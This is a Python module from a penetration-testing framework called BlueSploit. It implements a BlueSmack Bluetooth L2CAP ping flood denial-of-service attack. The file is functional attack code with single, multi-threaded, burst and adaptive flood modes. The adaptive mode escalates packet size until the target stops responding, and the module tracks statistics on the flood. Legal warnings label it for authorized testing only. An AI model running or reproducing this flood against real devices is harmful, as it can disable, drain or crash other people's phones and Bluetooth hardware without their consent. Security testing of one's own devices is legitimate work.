"""
BlueSploit Module: L2ping Flood (BlueSmack DoS)
Bluetooth Classic L2CAP ping flood attack for stress testing

WARNING: This module is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use against devices you don't own is ILLEGAL.

Author: v33ru
"""

import subprocess
import threading
import signal
import time
import os
import sys
from typing import Optional, List, Dict, Any
from dataclasses import dataclass
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity, ExploitResult
)
from core.utils.printer import (
    print_success, print_error, print_info, 
    print_warning, Colors
)


@dataclass
class FloodStats:
    """Track flood attack statistics"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = 0
    running: bool = False


class Module(ExploitModule):
    """
    L2ping Flood Attack (BlueSmack)
    
    Floods target Bluetooth device with L2CAP echo requests causing:
    - Device becomes unresponsive
    - Connection drops
    - Battery drain
    - Potential crashes on vulnerable firmware
    
    Attack Modes:
    - single: Single l2ping process with flood flag
    - multi: Multiple parallel l2ping processes
    - burst: Repeated burst patterns with delays
    - adaptive: Adjusts intensity based on response
    
    Requirements:
    - Linux with BlueZ stack
    - Root/sudo privileges
    - Bluetooth adapter (hci0)
    
    LEGAL NOTICE: For authorized penetration testing only!
    """
    
    info = ModuleInfo(
        name="exploits/classic/l2ping_flood",
        description="L2CAP ping flood DoS attack (BlueSmack)",
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        references=[
            "https://trifinite.org/trifinite_stuff_bluesmack.html",
            "CVE-2006-6019"
        ]
    )
    
    def __init__(self):
        super().__init__()
        self.stats = FloodStats()
        self.processes: List[subprocess.Popen] = []
        self._stop_event = threading.Event()
        self._monitor_thread: Optional[threading.Thread] = None
    
    def _setup_options(self) -> None:
        """Define module options"""
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "interface": ModuleOption(
                name="interface",
                required=False,
                description="Bluetooth interface (hci0, hci1, etc.)",
                default="hci0"
            ),
            "size": ModuleOption(
                name="size",
                required=False,
                description="L2CAP packet size (bytes, max 65535)",
                default=600
            ),
            "count": ModuleOption(
                name="count",
                required=False,
                description="Number of packets (0 = infinite until stopped)",
                default=0
            ),
            "flood": ModuleOption(
                name="flood",
                required=False,
                description="Enable flood mode (no delay between packets)",
                default=True
            ),
            "threads": ModuleOption(
                name="threads",
                required=False,
                description="Number of parallel flood threads",
                default=1
            ),
            "mode": ModuleOption(
                name="mode",
                required=False,
                description="Attack mode: single, multi, burst, adaptive",
                default="single"
            ),
            "duration": ModuleOption(
                name="duration",
                required=False,
                description="Attack duration in seconds (0 = until Ctrl+C)",
                default=0
            ),
            "burst_count": ModuleOption(
                name="burst_count",
                required=False,
                description="Packets per burst (burst mode)",
                default=100
            ),
            "burst_delay": ModuleOption(
                name="burst_delay",
                required=False,
                description="Delay between bursts in ms (burst mode)",
                default=500
            ),
            "reverse": ModuleOption(
                name="reverse",
                required=False,
                description="Reverse ping (request echo from target)",
                default=False
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Response timeout in seconds",
                default=1
            )
        }
    
    def _check_requirements(self) -> bool:
        """Check if system meets requirements"""
        # Check for Linux
        if sys.platform != "linux":
            print_error("This module requires Linux with BlueZ stack")
            return False
        
        # Check for l2ping
        try:
            result = subprocess.run(
                ["which", "l2ping"],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                print_error("l2ping not found. Install with: sudo apt install bluez")
                return False
        except Exception as e:
            print_error(f"Error checking l2ping: {e}")
            return False
        
        # Check for root/sudo
        if os.geteuid() != 0:
            print_warning("Root privileges recommended for best results")
            print_info("Run with: sudo python bluesploit.py")
        
        # Check interface exists
        interface = self.get_option("interface")
        try:
            result = subprocess.run(
                ["hciconfig", interface],
                capture_output=True,
                text=True
            )
            if "No such device" in result.stderr:
                print_error(f"Interface {interface} not found")
                print_info("Available interfaces:")
                subprocess.run(["hciconfig", "-a"])
                return False
            
            if "DOWN" in result.stdout:
                print_warning(f"Interface {interface} is DOWN, bringing up...")
                subprocess.run(["sudo", "hciconfig", interface, "up"])
                
        except Exception as e:
            print_error(f"Error checking interface: {e}")
            return False
        
        return True
    
    def _build_l2ping_cmd(self, count: Optional[int] = None) -> List[str]:
        """Build l2ping command with options"""
        target = self.target
        interface = self.get_option("interface")
        size = int(self.get_option("size"))
        flood = self.get_option("flood")
        reverse = self.get_option("reverse")
        timeout = int(self.get_option("timeout"))
        
        if count is None:
            count = int(self.get_option("count"))
        
        # Clamp size to valid range
        size = max(1, min(65535, size))
        
        cmd = ["l2ping", "-i", interface, "-s", str(size)]
        
        if flood:
            cmd.append("-f")
        
        if reverse:
            cmd.append("-r")
        
        if count > 0:
            cmd.extend(["-c", str(count)])
        
        cmd.extend(["-t", str(timeout)])
        cmd.append(target)
        
        return cmd
    
    def _parse_l2ping_output(self, line: str) -> None:
        """Parse l2ping output and update stats"""
        if "bytes from" in line:
            self.stats.packets_sent += 1
            # Extract bytes if possible
            try:
                size = int(self.get_option("size"))
                self.stats.bytes_sent += size
            except:
                pass
        elif "Timed out" in line or "error" in line.lower():
            self.stats.errors += 1
    
    def _flood_worker(self, worker_id: int) -> None:
        """Worker thread for flood attack"""
        cmd = self._build_l2ping_cmd()
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self.processes.append(process)
            
            while not self._stop_event.is_set():
                if process.poll() is not None:
                    break
                
                line = process.stdout.readline()
                if line:
                    self._parse_l2ping_output(line)
            
            process.terminate()
            
        except Exception as e:
            if not self._stop_event.is_set():
                print_error(f"Worker {worker_id} error: {e}")
    
    def _burst_worker(self) -> None:
        """Burst mode attack worker"""
        burst_count = int(self.get_option("burst_count"))
        burst_delay = int(self.get_option("burst_delay")) / 1000.0
        
        burst_num = 0
        while not self._stop_event.is_set():
            burst_num += 1
            cmd = self._build_l2ping_cmd(count=burst_count)
            
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                self.processes.append(process)
                
                # Wait for burst to complete
                output, _ = process.communicate(timeout=30)
                for line in output.split('\n'):
                    self._parse_l2ping_output(line)
                
                self.processes.remove(process)
                
                # Delay between bursts
                if not self._stop_event.is_set():
                    time.sleep(burst_delay)
                    
            except subprocess.TimeoutExpired:
                process.kill()
            except Exception as e:
                if not self._stop_event.is_set():
                    print_error(f"Burst {burst_num} error: {e}")
    
    def _adaptive_worker(self) -> None:
        """Adaptive mode - adjusts intensity based on response"""
        base_size = int(self.get_option("size"))
        current_size = base_size
        no_response_count = 0
        
        while not self._stop_event.is_set():
            cmd = self._build_l2ping_cmd(count=10)
            # Override size
            cmd[cmd.index("-s") + 1] = str(current_size)
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                # Count successful responses
                responses = result.stdout.count("bytes from")
                timeouts = result.stdout.count("Timed out")
                
                self.stats.packets_sent += responses
                self.stats.errors += timeouts
                
                # Adapt based on responses
                if timeouts > responses:
                    # Target struggling, maintain pressure
                    no_response_count += 1
                    if no_response_count > 3:
                        print_info(f"  Target unresponsive - DoS likely effective")
                else:
                    # Target responding, increase intensity
                    no_response_count = 0
                    if current_size < 65535:
                        current_size = min(65535, current_size + 1000)
                        
            except subprocess.TimeoutExpired:
                no_response_count += 1
                print_info(f"  Target not responding (attempt {no_response_count})")
            except Exception as e:
                if not self._stop_event.is_set():
                    print_error(f"Adaptive error: {e}")
    
    def _monitor_stats(self) -> None:
        """Monitor and display attack statistics"""
        last_packets = 0
        
        while not self._stop_event.is_set():
            time.sleep(1)
            
            elapsed = time.time() - self.stats.start_time
            pps = self.stats.packets_sent - last_packets
            last_packets = self.stats.packets_sent
            
            total_mb = self.stats.bytes_sent / (1024 * 1024)
            
            # Clear line and print stats
            print(
                f"\r  {Colors.CYAN}[FLOODING]{Colors.RESET} "
                f"Time: {elapsed:.0f}s | "
                f"Packets: {self.stats.packets_sent} | "
                f"PPS: {pps} | "
                f"Data: {total_mb:.2f} MB | "
                f"Errors: {self.stats.errors}",
                end="", flush=True
            )
    
    def _cleanup(self) -> None:
        """Clean up processes and threads"""
        self._stop_event.set()
        
        # Terminate all l2ping processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        self.processes.clear()
        
        # Wait for monitor thread
        if self._monitor_thread and self._monitor_thread.is_alive():
            self._monitor_thread.join(timeout=2)
    
    def check(self) -> bool:
        """Check if target is reachable"""
        if not self._check_requirements():
            return False
        
        target = self.target
        interface = self.get_option("interface")
        
        print_info(f"Checking if {target} is reachable...")
        
        try:
            result = subprocess.run(
                ["l2ping", "-i", interface, "-c", "3", "-t", "2", target],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if "bytes from" in result.stdout:
                responses = result.stdout.count("bytes from")
                print_success(f"Target reachable! Got {responses}/3 responses")
                return True
            else:
                print_warning("Target not responding to L2CAP ping")
                print_info("Device may be:")
                print_info("  - Out of range")
                print_info("  - Not discoverable")
                print_info("  - Already DoS'd")
                return False
                
        except subprocess.TimeoutExpired:
            print_warning("Connection timed out")
            return False
        except Exception as e:
            print_error(f"Check failed: {e}")
            return False
    
    def run(self) -> bool:
        """Execute the L2ping flood attack"""
        # Legal warning
        print(f"\n  {Colors.RED}{'='*60}{Colors.RESET}")
        print(f"  {Colors.RED}WARNING: DENIAL OF SERVICE ATTACK{Colors.RESET}")
        print(f"  {Colors.RED}For AUTHORIZED penetration testing ONLY!{Colors.RESET}")
        print(f"  {Colors.RED}Unauthorized use is ILLEGAL.{Colors.RESET}")
        print(f"  {Colors.RED}{'='*60}{Colors.RESET}\n")
        
        if not self._check_requirements():
            return False
        
        target = self.target
        mode = self.get_option("mode")
        threads = int(self.get_option("threads"))
        duration = int(self.get_option("duration"))
        size = int(self.get_option("size"))
        
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        # Reset state
        self._stop_event.clear()
        self.stats = FloodStats()
        self.stats.start_time = time.time()
        self.stats.running = True
        
        print_info(f"Target      : {target}")
        print_info(f"Mode        : {mode}")
        print_info(f"Packet Size : {size} bytes")
        print_info(f"Threads     : {threads}")
        if duration > 0:
            print_info(f"Duration    : {duration} seconds")
        else:
            print_info(f"Duration    : Until Ctrl+C")
        
        print()
        print_warning("Starting flood attack... Press Ctrl+C to stop")
        print()
        
        # Setup signal handler for clean exit
        original_sigint = signal.getsignal(signal.SIGINT)
        
        def signal_handler(sig, frame):
            print(f"\n\n{Colors.YELLOW}[!] Stopping attack...{Colors.RESET}")
            self._cleanup()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        try:
            # Start monitor thread
            self._monitor_thread = threading.Thread(target=self._monitor_stats, daemon=True)
            self._monitor_thread.start()
            
            # Start attack based on mode
            workers = []
            
            if mode == "single":
                # Single process flood
                worker = threading.Thread(target=self._flood_worker, args=(0,))
                worker.start()
                workers.append(worker)
                
            elif mode == "multi":
                # Multiple parallel floods
                for i in range(threads):
                    worker = threading.Thread(target=self._flood_worker, args=(i,))
                    worker.start()
                    workers.append(worker)
                    time.sleep(0.1)  # Stagger start
                    
            elif mode == "burst":
                # Burst mode
                worker = threading.Thread(target=self._burst_worker)
                worker.start()
                workers.append(worker)
                
            elif mode == "adaptive":
                # Adaptive intensity
                worker = threading.Thread(target=self._adaptive_worker)
                worker.start()
                workers.append(worker)
            
            # Wait for duration or Ctrl+C
            if duration > 0:
                time.sleep(duration)
                self._stop_event.set()
            else:
                # Wait indefinitely until stopped
                while not self._stop_event.is_set():
                    time.sleep(0.5)
            
            # Wait for workers to finish
            for worker in workers:
                worker.join(timeout=3)
            
        except Exception as e:
            print_error(f"Attack error: {e}")
        finally:
            self._cleanup()
            signal.signal(signal.SIGINT, original_sigint)
        
        # Print final stats
        elapsed = time.time() - self.stats.start_time
        total_mb = self.stats.bytes_sent / (1024 * 1024)
        avg_pps = self.stats.packets_sent / elapsed if elapsed > 0 else 0
        
        print(f"\n\n  {Colors.CYAN}{'═'*50}{Colors.RESET}")
        print(f"  {Colors.CYAN}ATTACK SUMMARY{Colors.RESET}")
        print(f"  {Colors.CYAN}{'═'*50}{Colors.RESET}")
        print(f"  Target          : {target}")
        print(f"  Duration        : {elapsed:.1f} seconds")
        print(f"  Packets Sent    : {self.stats.packets_sent}")
        print(f"  Data Sent       : {total_mb:.2f} MB")
        print(f"  Average PPS     : {avg_pps:.0f}")
        print(f"  Errors/Timeouts : {self.stats.errors}")
        print(f"  {Colors.CYAN}{'═'*50}{Colors.RESET}\n")
        
        # Store result
        result = ExploitResult(
            success=self.stats.packets_sent > 0,
            message=f"Sent {self.stats.packets_sent} packets in {elapsed:.1f}s",
            data={
                "target": target,
                "packets_sent": self.stats.packets_sent,
                "bytes_sent": self.stats.bytes_sent,
                "duration": elapsed,
                "errors": self.stats.errors
            }
        )
        self.add_result(result)
        
        return result.success
